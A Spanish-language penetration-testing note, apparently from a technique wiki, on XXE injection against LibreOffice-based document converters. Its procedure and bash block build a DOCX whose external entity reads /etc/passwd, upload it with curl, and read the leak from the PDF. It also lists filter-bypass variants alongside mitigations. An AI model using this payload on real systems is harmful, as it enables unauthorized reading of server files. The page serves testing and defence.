---
topic: XXE en conversión con LibreOffice
tags: [linux, libreoffice, xxe, docx, file-read]
---

# XXE en conversión con LibreOffice

[🌐 English](libreoffice-xxe.en.md) | **Español**

## Concepto

Un servicio convierte documentos DOCX/ODT a PDF con LibreOffice. Si el documento incluye una entidad externa en `document.xml` o en los metadatos, el parser la resuelve y el contenido puede aparecer en el PDF o en la respuesta.

## Cuándo aplica

- Conversores DOCX/ODT a PDF, HTML o texto.
- LibreOffice ejecutado sin aislamiento sobre archivos de usuarios.
- Metadatos, imágenes o campos calculados que aceptan XML.

## Procedimiento

1. Descomprimir un DOCX de plantilla.
2. Insertar la entidad externa en `word/document.xml` o en los metadatos.
3. Reempaquetar el DOCX y subirlo al conversor.
4. Leer el archivo reflejado en el PDF resultante.

```bash
unzip -q template.docx -d docx
# Añadir <!ENTITY xxe SYSTEM "file:///etc/passwd"> y &xxe; en document.xml
zip -qr payload.docx . -x '*.docx'
curl -s -F "file=@payload.docx" http://<HOST>/convert.php -o result.pdf
pdftotext result.pdf -
```

## Variantes

- XXE en metadatos `docProps/core.xml`.
- ODT con `content.xml`.
- Conversión a HTML que refleja el error.
- Filtros que bloquean `file://` pero permiten `php://filter`.

## Limitaciones

- El parser debe resolver entidades externas.
- El conversor debe devolver el contenido o un error detallado.
- LibreOffice puede estar en modo seguro o sin red.

## Mitigación y detección

- Deshabilitar entidades externas y DTD en el conversor.
- Ejecutar LibreOffice en un contenedor sin acceso a archivos sensibles.
- Validar el DOCX y limitar el tamaño y los metadatos.

## Referencias

- <https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
- <https://documentation.libreoffice.org/en/english-documentation/>
- <https://attack.mitre.org/techniques/T1190/>
